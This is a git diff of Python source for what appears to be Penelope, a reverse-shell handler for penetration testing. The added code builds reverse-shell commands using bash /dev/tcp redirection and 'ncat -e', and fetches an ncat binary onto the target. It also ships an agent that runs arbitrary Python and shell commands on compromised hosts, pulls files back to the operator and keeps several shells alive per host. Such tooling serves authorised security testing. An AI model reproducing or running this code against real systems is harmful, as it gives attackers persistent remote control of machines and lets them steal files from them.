+					b"stats = os.statvfs('.'); result = stats.f_bavail * stats.f_frsize"))
+				available_space = int(self.responses.get())
 			else:
-				logger.error(f"Upload failed => {response.decode()}")
+				available_space = int(self.exec("df --block-size=1 .|tail -1|awk '{print $4}'", value=True))
 
-			self.exec(f"rm {temp}", raw=False)
+			need = size - available_space # TODO should test it, also size should be the actual size. Not the zipped one.
+
+			if need > 0:
+				logger.error("Not enough space on target")
+				logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', 'blue', 'DIM')} more bytes...", 'blue', 'DIM'))
+				return False
+
+			# Start Uploading
+			progress_bar = PBar(size, paint(f"[+] {paint('', 'blue', 'DIM')}--- ⇥  Uploading", 'green'), 35)
+
+			if self.agent:
+				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
+				self.progress_send = progress_bar
+				self.progress_send.queue = queue.SimpleQueue()
+				self.send(Messenger.message(Messenger.UPLOAD, data))
+
+				while self.progress_send.active:
+					sent = self.progress_send.queue.get()
+					self.progress_send.update(sent)
+				del self.progress_send
+
+				logger.info(paint("--- Remote unpacking...", 'blue', 'DIM'))
+				response = self.responses.get()
+				exit_code = self.responses.get()
+
+			else:
+				temp = self.tmp + "/" + rand(8)
+
+				for chunk in chunks(data.decode(), options.upload_chunk_size):
+					response = self.exec(f"echo -n {chunk} >> {temp}")
+					if response is False:
+						progress_bar.terminate()
+						return False
+					progress_bar.update(len(chunk))
+
+				logger.info(paint("--- Remote unpacking...", 'blue', 'DIM'))
+				dest = f"-C {remote_path}" if remote_path else ""
+				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
+				response = self.exec(cmd, value=True)
+				exit_code = self.exec("echo $temp", value=True)
+				self.exec(f"rm {temp}")
+
+			if remote_path:
+				altnames = list(map(lambda x: remote_path + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
+
+			if not int(exit_code):
+				for item in altnames:
+					logger.info(f"Successful upload! {paint('('+str(item)+')', 'yellow')}")
+			else:
+				logger.error(f"Upload failed")
+				print(paint(textwrap.indent(response.decode(), " *  "), 'yellow'))
+				return False
+
+			return altnames
 
 		elif self.OS == 'Windows':
 			logger.warning("Upload on Windows shells is not implemented yet")
 
 	def spawn(self, port=None, host=None):
+		#print(threading.current_thread().name)
 		if self.OS == "Unix":
 			if any([self.listener, port, host]):
-				_host,_port = self.socket.getsockname()
-				if not port: port = _port
-				if not host: host = _host
+				if not port: port = self._port
+				if not host: host = self._host
+
+				listener = Listener(host, port)
+
+				if self.bin['bash']:
+					# bash -i doesn't always work
+					# cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
+					cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"'
+
+				elif self.bin['sh']:
+					ncat_cmd = f'{self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
+					ncat_binary = self.tmp + '/ncat'
+					if not self.exec(f"test -f {ncat_binary} || echo x"):
+						cmd = ncat_cmd.format(ncat_binary)
+					else:
+						logger.warning("ncat is not available on the target")
+						ncat_binary = self.need_binary(
+							"ncat",
+							"https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat"
+							)
+						if ncat_binary:
+							cmd = ncat_cmd.format(ncat_binary)
+						else:
+							logger.error("Spawning shell aborted")
+				else:
+					logger.error("No available shell binary is present...")
+					return False
+
 				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
-				# bash -i doesn't always work
-				#cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
-				cmd = f'bash -c "nohup bash >& /dev/tcp/{host}/{port} 0>&1 &"'
-				if options.no_bash:
-					cmd = cmd.replace('bash',rand())
-				#timeout=None if self.interactive else self.latency
-				response = self.exec(cmd, raw=False) #,timeout=timeout)
-				if response.startswith(b'sh: '):
-					logger.error("Bash does not exist on target. Cannot spawn reverse shell...")
+				self.exec(cmd)
+
+				if listener: # TODO maybe leave some time before stopping it
+					listener.stop()
 			else:
 				host, port = self.socket.getpeername()
 				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
-				Connect(host, port)
+				if not Connect(host, port):
+					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
+					return self.spawn(port, self._host)
 
 		elif self.OS == 'Windows':
 			logger.warning("Spawn Windows shells is not implemented yet")
 
+		return True
+
 	def maintain(self):
-		current_num = len(core.hosts[self.name])
-		if current_num < options.maintain > 1:
-			try:
-				logger.warning(paint(f" --- Trying to maintain {options.maintain} "
-						f"active shells on {self.name} ---",'blue'))
-				core.hosts[self.name][-1].spawn()
-			except IndexError:
-				logger.error("No alive shell left. Cannot spawn another")
+		with core.lock:
+			current_num = len(core.hosts[self.name])
+			if 0 < current_num < options.maintain:
+				session = core.hosts[self.name][-1]
+				logger.warning(paint(f" --- Session {session.id} is trying to maintain {options.maintain} "
+					f"active shells on {self.name} ---", 'blue'))
+				session.spawn()
+				return True
+		return False
 
 	def kill(self):
-		core.lock.acquire()
 
-		self.control << 'stop'
+		if self not in core.rlist:
+			return True
 
-		if hasattr(menu,'sid') and hasattr(self,'id') and menu.sid == self.id:
-			menu.set_id(None)
+		thread_name = threading.current_thread().name
+		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")
 
-		self.lock.acquire()
+		if thread_name != 'Core':
+			if self.need_control_sessions and\
+				not self.spare_control_sessions and\
+				self.control_session is self:
+				sessions = ', '.join([str(session.id) for session in self.need_control_sessions])
+				if thread_name == 'Menu':
+					logger.warning(
+		f"Cannot kill Session {self.id} as the following sessions depend on it: {sessions}"
+					)
+					return False
+				else:
+					logger.error(f"Sessions {sessions} need a control session.")
 
-		if hasattr(self,'logfile'):
-			self.logfile.close()
+			core.control << f'self.sessions[{self.id}].kill()'
+			if thread_name == 'Menu':
+				menu.kill_wait = queue.SimpleQueue()
+				logger.error(menu.kill_wait.get())
+				del menu.kill_wait
 
+			self.maintain()
+			return
+
+		if self.subchannel.active:
+			self.subchannel.control << 'kill'
+
+		core.rlist.remove(self)
+		del core.sessions[self.id]
+
+		if self in core.wlist:
+			core.wlist.remove(self)
 		try:
-			del core.sessions[self.id]
-			core.rlist.discard(self)
-
 			self.socket.shutdown(socket.SHUT_RDWR)
 
-		except OSError: # The socket is already closed
-			pass
+		except OSError as e:
+			if e.errno == 107: # or e.errno == 9:
+				logger.debug("The socket is already terminated")
+			else:
+				raise
 
-		except (KeyError, AttributeError):
-			# The shutdown happened before object creation completed
-			self.is_invalid = True
+		self.socket.close()
 
-		finally:
-			self.socket.close()
-			self.lock.release()
-			core.lock.release()
-			if not hasattr(self,'is_invalid'):
-				logger.error(f"{paint(self.name, 'RED', 'white')}"
-				f"{paint('', 'red')} disconnected 💔")
+		if not self.OS:
+			message = f"Invalid shell from {paint(self.name, 'RED', 'white')}{paint('', 'red')} 🙄\r"
 
-				self.maintain()
+		else:
+			message = f"Session [{self.id}] died..."
 
-	def exit(self):
-		self.kill()
+			if not core.hosts[self.name]:
+				message += f" We lost {paint(self.name, 'RED', 'white')} {paint('', 'red')} 💔"
+
+		if hasattr(menu, 'kill_wait'):
+			menu.kill_wait.put(message)
+		else:
+			logger.error(message)
+
+		if hasattr(menu, 'sid') and hasattr(self, 'id') and menu.sid == self.id:
+			menu.set_id(None)
+
+		if hasattr(self, 'logfile'):
+			self.logfile.close()
+
 		if self.is_attached:
-			self.detach(killed=True)
+			self.detach()
 
+		return True
+
+class Messenger:
+	SHELL = 1
+	RESIZE = 2
+	UPLOAD = 3
+	DOWNLOAD = 4
+	PYTHON_EXEC = 5
+	SHELL_EXEC = 6
+	RESPONSE = 9
+
+	LEN_BYTES = 4
+
+	def __init__(self):
+
+		self.len_got = 0
+		self.len_bytes = None
+		self.len = None
+
+		self.mess_got = 0
+		self.mess_last_got = 0
+
+		if not OLD:
+			self.buffer = io.BytesIO()
+			self.message_buf = io.BytesIO()
+		else:
+			self.buffer_index = 0
+			self.buffer = None
+			self.message_buf = None
+
+	@staticmethod
+	def message(_type, _data):
+		_len = len(_data)
+		return struct.pack('!IB' + str(_len) + 's', _len + 1, _type, _data)
+
+	def feed(self, data):
+		messages = []
+
+		if not OLD:
+			position = self.buffer.tell()
+			self.buffer.seek(0, io.SEEK_END)
+			self.buffer.write(data)
+			self.buffer.seek(position)
+		else:
+			if not self.buffer:
+				self.buffer = data
+			else:
+				self.buffer += data
+
+		while True:
+			if not self.len:
+				need = Messenger.LEN_BYTES - self.len_got
+				if not OLD:
+					data = self.buffer.read(need)
+				else:
+					if self.buffer:
+						data = self.buffer[self.buffer_index:self.buffer_index + need]
+						#self.buffer_index += need
+					else:
+						data = None
+				if not data:
+					break
+				self.len_got += len(data)
+
+				if OLD:
+					self.buffer_index += self.len_got
+
+				if not self.len_bytes:
+					self.len_bytes = data
+				else:
+					self.len_bytes += data
+
+				if self.len_got == Messenger.LEN_BYTES:
+					self.len = struct.unpack('!I', self.len_bytes)[0]
+
+			if self.len:
+				to_get = self.len - self.mess_got
+				if not OLD:
+					data = self.buffer.read(to_get)
+				else:
+					if self.buffer:
+						data = self.buffer[self.buffer_index:self.buffer_index + to_get]
+						#self.buffer_index += to_get
+					else:
+						data = None
+
+				if not data:
+					break
+				self.mess_last_got = len(data)
+				self.mess_got += self.mess_last_got
+				if OLD:
+					self.buffer_index += self.mess_last_got
+				if not OLD:
+					self.message_buf.write(data)
+				else:
+					if not self.message_buf:
+						self.message_buf = data
+					else:
+						self.message_buf += data
+
+				if self.mess_got == self.len:
+					self.len_got = 0
+					self.len_bytes = None
+					self.len = None
+
+					self.mess_got = 0
+
+					if not OLD:
+						self.message_buf.seek(0)
+						_type = struct.unpack('!B', self.message_buf.read(1))[0]
+						_message = self.message_buf.read()
+						self.message_buf.seek(0)
+						self.message_buf.truncate(0)
+					else:
+						_type = struct.unpack('!B', self.message_buf[0])[0]
+						_message = self.message_buf[1:]
+						self.message_buf = None
+
+					messages.append((_type, _message))
+					#open("/tmp/" + "ppp2", "a").write(repr((_type, _message)) + "\n")
+		if not OLD:
+			self.buffer.seek(0)
+			self.buffer.truncate(0)
+		else:
+			self.buffer = None
+			self.buffer_index = 0
+		return messages
+
+
+def agent():
+	import os
+	import tty
+	import sys
+	import pty
+	import glob
+	import fcntl
+	import select
+	import struct
+	import signal
+	import termios
+	import tarfile
+	import subprocess
+
+	NET_BUF_SIZE = 8192
+	OLD = sys.version_info < (2, 6)
+	if not OLD:
+		import io
+	else:
+		import tempfile
+	{}
+	messenger = Messenger()
+
+	respond = lambda _type, _value: os.write(pty.STDOUT_FILENO, Messenger.message(_type, _value))
+
+	pid, master_fd = pty.fork()
+	if pid == pty.CHILD:
+		os.execlp("{}", "-i") # TEMP # TODO
+
+	try:
+		fds = [master_fd, pty.STDIN_FILENO]
+		while True: # while fds, while True
+			rfds, wfds, xfds = select.select(fds, [], [])
+
+			if master_fd in rfds:
+				data = os.read(master_fd, NET_BUF_SIZE)
+				if not data:
+					raise OSError
+				respond(Messenger.SHELL, data)
+
+			if pty.STDIN_FILENO in rfds:
+				data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
+				if not data:
+					raise OSError
+
+				messages = messenger.feed(data)
+				for _type, _value in messages:
+					if   _type == Messenger.SHELL:
+						pty._writen(master_fd, _value)
+
+					elif _type == Messenger.RESIZE:
+						fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)
+
+					elif _type == Messenger.UPLOAD:
+						try:
+							if not OLD:
+								tarfile.open(mode='r:gz', fileobj=io.BytesIO(_value)).extractall()
+							else:
+								tmpf = tempfile.TemporaryFile()
+								tmpf.write(_value)
+								tmpf.seek(0)
+								x = tarfile.open(mode='r:gz', fileobj=tmpf)
+								x.errorlevel=1
+								x.extractall()
+								tmpf.close()
+						except: #TODO
+							_, e, _ = sys.exc_info()
+							respond(Messenger.RESPONSE, str(e).encode())
+							respond(Messenger.RESPONSE, str(1).encode())
+						else:
+							respond(Messenger.RESPONSE, "OK".encode())
+							respond(Messenger.RESPONSE, str(0).encode())
+
+					elif _type == Messenger.DOWNLOAD:
+						try:
+							if not OLD:
+								tmpf = io.BytesIO()
+							else:
+								tmpf = tempfile.TemporaryFile()
+							tar = tarfile.open(mode='w:gz', fileobj=tmpf)
+							for item in glob.glob(os.path.expanduser(_value.decode())):
+								tar.add(item)
+							tar.close()
+							if not OLD:
+								data = tmpf.getvalue()
+							else:
+								tmpf.seek(0)
+								data = tmpf.read()
+								tmpf.close()
+						except:
+							_, e, _ = sys.exc_info()
+							respond(Messenger.RESPONSE, str(-1).encode())
+							respond(Messenger.RESPONSE, str(e).encode())
+
+						else:
+							respond(Messenger.RESPONSE, str(len(data)).encode())
+							respond(Messenger.RESPONSE, data)
+
+					elif _type == Messenger.PYTHON_EXEC:
+						result = None
+						_locals = locals()
+						{}
+						result = _locals['result']
+						if result:
+							respond(Messenger.RESPONSE, str(result).encode())
+
+					elif _type == Messenger.SHELL_EXEC:
+						result = os.popen(_value.decode()).read()
+						respond(Messenger.RESPONSE, str(result).encode())
+	except:
+		#_, e, t = sys.exc_info()
+		#import traceback
+		#traceback.print_exc()
+		#traceback.print_stack()
+		#respond(Messenger.RESPONSE, str(t).encode())
+		pass
+
+	os.close(master_fd)
+	os.waitpid(pid, 0)[1]
+
+	os.kill(os.getppid(), signal.SIGKILL) # TODO
+
+
+################################## GENERAL PURPOSE CUSTOM CODE ####################################
+
+caller = lambda: inspect.stack()[2].function
+rand = lambda _len: ''.join(random.choice(string.ascii_letters) for i in range(_len))
+bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
+chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
+pathlink = lambda filepath: (f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
+		f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07')
+
+def Open(item):
+	error = subprocess.Popen(
+		({'Linux':'xdg-open', 'Darwin':'open'}[OS], item),
+		stdin=subprocess.DEVNULL,
+		stdout=subprocess.DEVNULL,
+		stderr=subprocess.PIPE
+		).stderr.read()
+	if error:
+		logger.error(error.decode())
+		return False
+	return True
+
+def ask(text):
+	try:
+		return input(f"\r{paint(f'[?] {text}: ', 'yellow')}")
+
+	except EOFError:
+		return ask(text)
 
 class Interfaces:
 
@@ -1842,7 +2679,7 @@ class Interfaces:
 		return str(table)
 
 	def oneLine(self):
-		return '('+str(self).replace('\n','|')+')'
+		return '(' + str(self).replace('\n', '|') + ')'
 
 	def translate(self, iface_ip):
 		if iface_ip in self.list:
@@ -1855,8 +2692,8 @@ class Interfaces:
 	@property
 	def list(self):
 		if OS == 'Linux':
-			output = subprocess.check_output(['ip','a']).decode()
-			interfaces = re.findall(r'(?m)(?<=^ {4}inet )([^ /]*).* ([^ ]*)$',output)
+			output = subprocess.check_output(['ip', 'a']).decode()
+			interfaces = re.findall(r'(?m)(?<=^ {4}inet )([^ /]*).* ([^ ]*)$', output)
 			return {i[1]:i[0] for i in interfaces}
 
 		elif OS == 'Darwin':
@@ -1900,10 +2737,6 @@ class Table:
 	def header(self, header):
 		self.add_row(header, header=True)
 
-	@staticmethod
-	def real_len(text):
-		return len(re.sub(r'\x1b\[\d+(;\d+)*m', '', text))
-
 	def __str__(self):
 		self.fill()
 		return "\n".join([self.joinchar.join(row) for row in self.data])
@@ -1925,8 +2758,9 @@ class Table:
 
 		new_row = []
 		for index, element in enumerate(row):
-			element = str(element)
-			elem_length = self.real_len(element)
+			if not isinstance(element, str):
+				element = str(element)
+			elem_length = len(element)
 			new_row.append(element)
 			if elem_length > self.col_max_lens[index]:
 				self.col_max_lens[index] = elem_length
@@ -1947,8 +2781,50 @@ class Table:
 				if index in [*self.fillchar][1:]:
 					fillchar = self.fillchar[0]
 
-				row[index] = element + fillchar * (self.col_max_lens[index] - self.real_len(element))
+				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))
 
+
+class PBar:
+	pbars = []
+
+	def __init__(self, end, caption="", max_width=None):
+		self.pos = 0
+		self.end = end # end > 0 # TODO
+		self.active = True
+		self.caption = caption
+		self.max_width = max_width
+		__class__.pbars.append(self)
+
+	@property
+	def percent(self):
+		return int(self.pos * 100 / self.end)
+
+	def update(self, step=1):
+		self.pos += step
+		if self.pos > self.end:
+			self.pos = self.end
+		if self.active:
+			self.render()
+
+	def render(self):
+		percent = self.percent
+		self.active = False if percent == 100 else True
+		cursor = "\x1b[?25l" if self.active else "\x1b[?25h" # __exit__ TODO
+		left = f"{self.caption} ["
+		right = f"] {str(percent).rjust(3)}%"
+		up = f"\x1b[A" if self.active else ""
+		bar_space = self.max_width if self.max_width else os.get_terminal_size().columns - len(left) - len(right)
+		bars = int(percent * bar_space / 100) * "#"
+		print(f'{cursor}{left}{bars.ljust(bar_space, ".")}{right}{up}')
+
+	def terminate(self):
+		print("\x1b[?25h")
+
+class Colored(str):
+	def __init__(self, colored_text):
+		self.colored_text = colored_text
+	def __len__(self):
+		return len(re.sub(r'\x1b\[\d+(;\d+)*m', '', self.colored_text))
 
 class Color:
 	codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
@@ -1963,7 +2839,7 @@ class Color:
 		code_sequence=';'.join([str(__class__.codes[color]) for color in colors])
 		prefix = __class__.escape(code_sequence) if code_sequence else ''
 		suffix = __class__.escape(__class__.codes['RESET']) if (text and prefix) or reset else ''
-		return f"{prefix}{text}{suffix}"
+		return Colored(f"{prefix}{text}{suffix}")
 
 
 class CustomFormatter(logging.Formatter):
@@ -1978,45 +2854,43 @@ class CustomFormatter(logging.Formatter):
 		template = __class__.TEMPLATES[record.levelno]
 		prefix = "\r" if core.attached_session is None else ""
 		suffix = "\r" if core.attached_session is not None else ""
-		text = prefix + f"{template['prefix']} {logging.Formatter.format(self, record)}" + suffix
+		thread = " " + paint(threading.current_thread().name, 'CYAN', 'white', reset=True)\
+			if record.levelno is logging.DEBUG or options.debug else ""
+		text = prefix + f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}" + suffix
 		return paint(text, template['color'])
 
+##########################################################################################################
 
 def ControlC(num, stack):
 	if core.attached_session:
 		core.attached_session.detach()
 
 	elif "Menu" in core.threads:
-		#os.write(sys.stdout.fileno(),b'^C\n')
-		#os.write(sys.stdout.fileno(),menu.prompt.encode())
+		#os.write(sys.stdout.fileno(), b'^C\n')
+		#os.write(sys.stdout.fileno(), menu.prompt.encode())
 		if menu.sid:
-			core.sessions[menu.sid].control << 'stop'
+			core.sessions[menu.sid].subchannel.control << 'stop'
 
 	elif not core.sessions:
 		core.stop()
 
+def WinResize(num, stack):
+	if core.attached_session is not None and core.attached_session.type == "PTY":
+		threading.Thread(target=core.attached_session.update_pty_size, name="RESIZE").start()
 
 # CONSTANTS
 OS = platform.system()
-OSes = {'Unix':'🐧','Windows':'💻'}
+OSes = {'Unix':'🐧', 'Windows':'💻'}
 TTY_NORMAL = termios.tcgetattr(sys.stdin)
 NET_BUF_SIZE = 8192
-
-pathlink = lambda filepath: (f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
-		f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07')
-
-Open =	lambda item:\
-	True if not re.search(b"(Cannot open display:|Error:)",
-	subprocess.Popen(({'Linux':'xdg-open','Darwin':'open'}[OS], item),
-	stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE).stderr.read())\
-	else logger.error("Cannot open the item locally; If on SSH, use X11Forwarding")
-
-rand = lambda: ''.join(random.choice(string.ascii_letters) for i in range(8))
-
-chunks = lambda string, length: (string[0+i:length+i] for i in range(0, len(string), length))
+LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+MESSENGER = inspect.getsource(Messenger)
+AGENT = inspect.getsource(agent)
+OLD = sys.version_info < (2, 6)
 
 # INITIALIZATION
 signal.signal(signal.SIGINT, ControlC)
+signal.signal(signal.SIGWINCH, WinResize)
 
 ## CREATE BASIC OBJECTS
 paint = Color()
@@ -2037,7 +2911,7 @@ class Options:
 		self.max_maintain = 10
 		self.maintain = 1
 		self.max_open_files = 5
-		self.upload_chunk_size = 10240
+		self.upload_chunk_size = 51200
 		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
 		self.basedir = Path.home() / f'.{__program__}'
 		self.logfile = f"{__program__}.log"
@@ -2081,6 +2955,7 @@ class Options:
 				show(f"Maintain value decreased to the max ({self.max_maintain})")
 				value = self.max_maintain
 			if value < 1: value = 1
+			#if value == 1: show(f"Maintain value should be 2 or above")
 			if value > 1 and self.single_session:
 				show(f"Single Session mode disabled because Maintain is enabled")
 				self.single_session = False
@@ -2089,6 +2964,12 @@ class Options:
 			if self.maintain > 1 and value:
 				show(f"Single Session mode disabled because Maintain is enabled")
 				value = False
+
+		elif option == 'black_list_bins':
+			if value is None:
+				value = []
+			elif type(value) is str:
+				value = re.split('[^a-zA-Z0-9]+', value)
 
 		elif option == 'configfile':
 			self.__dict__[option] = value
@@ -2132,9 +3013,9 @@ verbosity = parser.add_argument_group("Verbosity")
 verbosity.add_argument("-Q", "--silent", help="Be a bit less verbose", action="store_true")
 verbosity.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
 
-log = parser.add_argument_group("Logging")
+log = parser.add_argument_group("Session Logging")
 log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
-log.add_argument("-T", "--no-timestamps", help="Do not include timestamps on logs", action="store_true")
+log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")
 
 misc = parser.add_argument_group("Misc")
 misc.add_argument("-r", "--configfile", help="Configuration file location", type=Path, metavar='')
@@ -2146,8 +3027,7 @@ misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upo
 misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
 
 debug = parser.add_argument_group("Debug")
-debug.add_argument("-NP", "--no-python", help="Simulate python absence on target", action="store_true")
-debug.add_argument("-NB", "--no-bash", help="Simulate bash absence on target", action="store_true")
+debug.add_argument("-N", "--black-list-bins", help="Simulate python absence on target")
 debug.add_argument("-v",  "--version", help="Show Penelope version", action="store_true")
 
 args = [] if not __name__ == "__main__" else None
@@ -2159,7 +3039,7 @@ stdout_handler.setFormatter(CustomFormatter())
 
 file_handler = logging.FileHandler(options.logfile)
 file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
-file_handler.setLevel('INFO')
+file_handler.setLevel('INFO') # ??? TODO
 
 debug_file_handler = logging.FileHandler(options.debug_logfile)
 debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
@@ -2174,14 +3054,25 @@ cmdlogger = logging.getLogger(f"{__program__}_cmd")
 cmdlogger.setLevel(logging.INFO)
 cmdlogger.addHandler(stdout_handler)
 
+DEV_MODE = False
+if DEV_MODE:
+	stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
+	logger.setLevel('DEBUG')
+	options.max_maintain = 50
+	options.black_list_bins = 'python,python3,script'
+
 # MAIN
 if __name__ == "__main__":
+
 	if options.version:
 		print(__version__)
+
 	elif options.interfaces:
 		print(Interfaces())
+
 	elif options.connect:
 		Connect(options.connect, options.ports[0])
+
 	else:
 		if options.ports:
 			for port in options.ports:
@@ -2193,3 +3084,4 @@ if __name__ == "__main__":
 				menu.show()
 			else:
 				Listener()
+
